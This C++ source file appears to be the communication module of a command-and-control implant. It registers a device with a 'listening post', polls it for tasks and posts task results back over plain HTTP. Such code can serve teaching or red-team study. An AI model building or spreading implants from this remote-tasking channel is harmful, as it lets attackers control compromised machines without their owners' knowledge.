#include "api.hpp"

Api &Api::get_instance() {
    if (!instance) {
        instance.reset(new Api());
    }
    return *instance;
}

void Api::setup(std::string host, std::string port) {
    host_ = host;
    port_ = port;
}

std::string Api::register_device(std::string uid, std::string name)
{   
    /* API Path */
    std::string api_uri_register = uri_ + "user/register";

    /* Create payload as JSON */
    boost::property_tree::ptree resultsLocal;
    resultsLocal.add("uid", uid);
    resultsLocal.add("name", name);
    std::stringstream resultsStringStream;
    boost::property_tree::write_json(resultsStringStream, resultsLocal);

    /* Send API request */
    return send_http_post_request(host_, port_, api_uri_register, resultsStringStream.str());
}

bool Api::assert_ping_pong() {
    /* API Path */
    std::string api_uri_ping= "/ping";

    /* Send API request */
    std::string response = send_http_get_request(host_, port_, api_uri_ping);

    return response == "PONG !";
}

std::string Api::get_tasks(std::string uid) {
    /* API Path */
    std::string api_uri_result = uri_ + "task/anyforme";

    /* Create payload as JSON */
    boost::property_tree::ptree resultsLocal;
    resultsLocal.add("uid", uid);
    std::stringstream resultsStringStream;
    boost::property_tree::write_json(resultsStringStream, resultsLocal);

    /* Send API request */
    return send_http_post_request(host_, port_, api_uri_result, resultsStringStream.str());
}

std::string Api::send_result(std::unique_ptr<Result> result) {
    /* API Path */
    std::string api_uri_result = uri_ + "result/add";

    /* Create payload as JSON */
    boost::property_tree::ptree resultsLocal;
    resultsLocal.add("uid", result->id);
    resultsLocal.add("content", result->content);
    resultsLocal.add("code", result->code);
    std::stringstream resultsStringStream;
    boost::property_tree::write_json(resultsStringStream, resultsLocal);

    /* Send API request */
    return send_http_post_request(host_, port_, api_uri_result, resultsStringStream.str());
}

std::string Api::send_http_post_request(std::string host,
    std::string port,
    std::string uri,
    std::string payload) {
    // Set all our request constants
    auto const serverAddress = host;
    auto const serverPort = port;
    auto const serverUri = uri;

    auto requestBody = json({});
    if (!payload.empty())
        requestBody = json::parse(payload);

    std::cout << requestBody << std::endl;

    // Construct our listening post endpoint URL from user args, only HTTP to start
    std::stringstream ss;
    ss << "http://" << serverAddress << ":" << serverPort << serverUri;
    std::string fullServerUrl = ss.str();

    std::cout << fullServerUrl << std::endl;
    
    // Make an asynchronous HTTP POST request to the listening post
    cpr::AsyncResponse asyncRequest = cpr::PostAsync(cpr::Url{ fullServerUrl },
        cpr::Body{ requestBody.dump() },
        cpr::Header{ {"Content-Type", "application/json"} }
    );
    // Retrieve the response when it's ready
    cpr::Response response = asyncRequest.get();

    // Show the request contents
    std::cout << "Request body: " << requestBody << std::endl;

    // Return the body of the response from the listening post, may include new tasks
    return response.text;
}

std::string Api::send_http_get_request(std::string host, std::string port, std::string uri) {
    // Set all our request constants
    auto const serverAddress = host;
    auto const serverPort = port;
    auto const serverUri = uri;

    // Construct our listening post endpoint URL from user args, only HTTP to start
    std::stringstream ss;
    ss << "http://" << serverAddress << ":" << serverPort << serverUri;
    std::string fullServerUrl = ss.str();

    std::cout << fullServerUrl << std::endl;
    
    // Make an asynchronous HTTP GET request to the listening post
    cpr::AsyncResponse asyncRequest = cpr::GetAsync(cpr::Url{ fullServerUrl });
    // Retrieve the response when it's ready
    cpr::Response response = asyncRequest.get();

    // Return the body of the response from the listening post, may include new tasks
    return response.text;
}